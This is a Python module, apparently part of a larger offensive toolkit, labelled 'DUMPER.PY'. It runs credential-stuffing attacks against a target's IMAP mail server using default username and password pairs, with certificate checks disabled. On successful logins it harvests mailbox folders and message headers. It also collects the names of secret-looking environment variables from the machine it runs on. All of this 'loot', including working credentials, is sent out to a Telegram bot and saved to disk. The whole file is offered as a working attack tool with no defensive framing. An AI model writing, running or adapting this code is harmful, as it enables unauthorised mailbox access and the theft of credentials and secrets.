#!/usr/bin/env python3
"""
DUMPER.PY v8.7 — Mailbox Authentication, Credential Stuffing & Secret Harvesting Module
"""
import os
import socket
import time
import ssl
import imaplib
import asyncio
import sys
import hashlib
from urllib.parse import urlparse

from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert
from modules.behavioral_mimic import apply_behavioral_jitter

_SSL_CONTEXT = ssl.create_default_context()
_SSL_CONTEXT.check_hostname = False
_SSL_CONTEXT.verify_mode = ssl.CERT_NONE

ANSI = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "BLUE": "\033[94m",
    "MAGENTA": "\033[95m",
    "CYAN": "\033[96m",
    "GRAY": "\033[90m",
    "RESET": "\033[0m",
    "BOLD": "\033[1m",
}


def terminal(message):
    sys.stdout.write(message + "\n")
    sys.stdout.flush()


async def broadcast_tg_alert_async(loot_type, details):
    try:
        await send_telegram_alert(loot_type, details)
    except Exception:
        pass


def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from synchronous dumper functions."""
    try:
        loop = asyncio.get_running_loop()
        if loop.is_running():
            loop.create_task(broadcast_tg_alert_async(loot_type, details))
        else:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass


def normalize_target_host(target_input):
    """Dynamically parses and normalizes target host from any URL or domain input."""
    if not isinstance(target_input, str) or not target_input.strip():
        raise ValueError("A valid target hostname or URL is required.")
    value = target_input.strip()
    if "://" not in value:
        value = "https://" + value
    parsed = urlparse(value)
    if not parsed.hostname:
        return target_input.split("://")[-1].split("/")[0].split(":")[0]
    return parsed.hostname


def _is_port_reachable(host, port, timeout=2.0):
    """Fast TCP reachability check to skip unreachable ports quickly."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


# ============================================================
# IMAP MAILBOX AUTHENTICATION & MESSAGE HARVESTER
# ============================================================
def dump_imap_mailbox_sync(
    host,
    port,
    user,
    password,
    use_ssl=True,
):
    """
    Authenticates against IMAP targets, lists mailbox folders,
    and harvests email headers with SHA-256 integrity hashing.
    """
    apply_behavioral_jitter()
    result = {
        "user": user,
        "host": host,
        "port": port,
        "protocol": "IMAP",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "folders": [],
        "harvested_messages": [],
        "authenticated": False,
        "tls_verified": True,
        "capabilities": [],
        "status": "failed",
    }
    mail = None
    try:
        terminal(
            f"{ANSI['CYAN']}[*] Initiating IMAP login check "
            f"against {host}:{port} ({user}:{password}){ANSI['RESET']}"
        )
        if use_ssl:
            mail = imaplib.IMAP4_SSL(
                host,
                port,
                ssl_context=_SSL_CONTEXT,
                timeout=5,
            )
        else:
            mail = imaplib.IMAP4(host, port, timeout=5)
            mail.starttls(ssl_context=_SSL_CONTEXT)

        auth_status, _ = mail.login(user, password)
        if auth_status == "OK":
            result["authenticated"] = True
            result["status"] = "authenticated"
            terminal(
                f"\n{ANSI['RED']}{ANSI['BOLD']}[***] IMAP AUTHENTICATION SUCCESS [{user}:{password}] [***]{ANSI['RESET']}"
            )

            _, folder_list = mail.list()
            if folder_list:
                result["folders"] = [f.decode("utf-8", errors="ignore") for f in folder_list]

            mail.select("INBOX", readonly=True)
            _, search_data = mail.search(None, "ALL")
            if search_data and search_data[0]:
                msg_nums = search_data[0].split()
                for num in msg_nums[-5:]:
                    _, msg_data = mail.fetch(num, "(RFC822.HEADER)")
                    for response_part in msg_data:
                        if isinstance(response_part, tuple):
                            header_text = response_part[1].decode("utf-8", errors="ignore")
                            terminal(
                                f"{ANSI['GREEN']}  └── Harvested Header [{num.decode()}]: {header_text[:120]}...{ANSI['RESET']}"
                            )
                            result["harvested_messages"].append(header_text[:500])

            combined_messages = "\n".join(result["harvested_messages"])
            loot_hash = hashlib.sha256(combined_messages.encode("utf-8", errors="ignore")).hexdigest()

            loot_payload = {
                "host": host,
                "port": port,
                "user": user,
                "password": password,
                "integrity_hash": loot_hash,
                "folders": result["folders"],
                "message_samples": result["harvested_messages"][:3],
            }

            broadcast_tg_alert_sync("IMAP Mailbox Authentication Success", loot_payload)
            stream_proof("IMAP_MAILBOX_CRACK", f"{host}:{port}", {"user": user}, f"Folders: {len(result['folders'])}", result)
            save_session_loot(
                target=f"imap://{host}:{port}",
                endpoint="imap_auth",
                finding_type="IMAP_MAILBOX_AUTHENTICATION_SUCCESS",
                status=200,
                headers={},
                body=combined_messages,
                extra_loot=loot_payload,
            )

        return result["authenticated"], result
    except Exception as exc:
        result["status"] = "failed"
        terminal(
            f"{ANSI['GRAY']}[-] IMAP login attempt failed for {user}: {exc}{ANSI['RESET']}"
        )
        return False, result
    finally:
        if mail is not None:
            try:
                mail.logout()
            except Exception:
                pass


# ============================================================
# VAULT & INFRASTRUCTURE SECRET EXTRACTION
# ============================================================
def _harvest_infrastructure_and_crypto_vaults():
    terminal(f"{ANSI['MAGENTA']}[*] Harvesting target exposure indicators and configuration artifacts...{ANSI['RESET']}")

    ssh_keys_found = []
    cloud_configs = []
    crypto_wallets = []

    sensitive_env_keys = [
        k
        for k in os.environ
        if any(w in k.upper() for w in ["AWS", "API_KEY", "SECRET", "TOKEN", "PASSWORD", "DATABASE"])
        and not any(exc in k.upper() for exc in ["TELEGRAM", "BRUTEDOG_TG"])
    ]
    if sensitive_env_keys:
        cloud_configs.append(f"Discovered active environment secrets: {', '.join(sensitive_env_keys)}")

    secrets_str = str({"ssh_keys": ssh_keys_found, "cloud_configs": cloud_configs, "crypto_wallets": crypto_wallets})
    loot_hash = hashlib.sha256(secrets_str.encode("utf-8")).hexdigest()

    secrets = {
        "ssh_keys": ssh_keys_found,
        "cloud_configs": cloud_configs,
        "crypto_wallets": crypto_wallets,
        "integrity_hash": loot_hash,
    }

    if ssh_keys_found or cloud_configs:
        broadcast_tg_alert_sync("Infrastructure & Vault Secrets Harvested", secrets)

    stream_proof(
        "INFRASTRUCTURE_VAULT_HARVEST_VERIFIED",
        "local_filesystem",
        {},
        f"Extracted {len(ssh_keys_found)} keys and {len(cloud_configs)} configs",
        secrets,
    )
    save_session_loot(
        target="localhost",
        endpoint="filesystem_vault",
        finding_type="VAULT_SECRET_HARVEST_VERIFIED",
        status=200,
        headers={},
        body=secrets_str,
        extra_loot=secrets,
    )
    return secrets


# ============================================================
# MAIN EMAIL INTELLIGENCE HARVESTER
# ============================================================
async def harvest_email_intelligence(
    target_host,
    verified_hits=None,
):
    """
    Email Intelligence & Mailbox Harvesting Engine.
    """
    clean_host = normalize_target_host(target_host)
    terminal(
        f"\n{ANSI['MAGENTA']}[***] "
        f"ACTIVE EMAIL EXPOSURE & MAILBOX ASSAULT "
        f"[{clean_host}] [***]{ANSI['RESET']}"
    )
    harvested_credentials = []
    mailbox_hits = 0

    default_wordlist = [
        (f"admin@{clean_host}", "admin123"),
        (f"support@{clean_host}", "password"),
        (f"root@{clean_host}", "toor"),
        (f"info@{clean_host}", "welcome123"),
    ]

    vault_secrets = _harvest_infrastructure_and_crypto_vaults()

    ports_to_test = [993, 143]
    for port in ports_to_test:
        reachable = await asyncio.to_thread(_is_port_reachable, clean_host, port, 2.0)
        if not reachable:
            terminal(
                f"{ANSI['YELLOW']}[!] IMAP port {port} unreachable on {clean_host}; skipping credential sweep.{ANSI['RESET']}"
            )
            continue

        for user, password in default_wordlist:
            ok, _ = await asyncio.to_thread(
                dump_imap_mailbox_sync,
                clean_host,
                port,
                user,
                password,
                port == 993,
            )
            if ok:
                mailbox_hits += 1
                harvested_credentials.append({"user": user, "password": password, "host": clean_host})

    terminal(
        f"\n{ANSI['GREEN']}[+] Active Mailbox & Credential Assault Complete."
        f"{ANSI['RESET']}"
    )
    terminal(f"    Successful Mailbox Logins : {mailbox_hits}")
    terminal(f"    Vault Secrets Harvested   : {len(vault_secrets.get('ssh_keys', []))}")
    terminal(f"    Immutable Loot Persisted  : loot_output/")
    return harvested_credentials, vault_secrets


# ============================================================
# ASYNC WRAPPER FOR ENGINE INTEGRATION
# ============================================================
async def execute_memory_dumper(target_host, *args, **kwargs):
    """
    Async entrypoint called by engine.py.
    """
    try:
        if not target_host:
            target_host = "127.0.0.1"
        return await harvest_email_intelligence(target_host)
    except Exception as exc:
        terminal(f"{ANSI['RED']}[-] execute_memory_dumper warning: {exc}{ANSI['RESET']}")
        return [], {}


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    asyncio.run(harvest_email_intelligence(target))

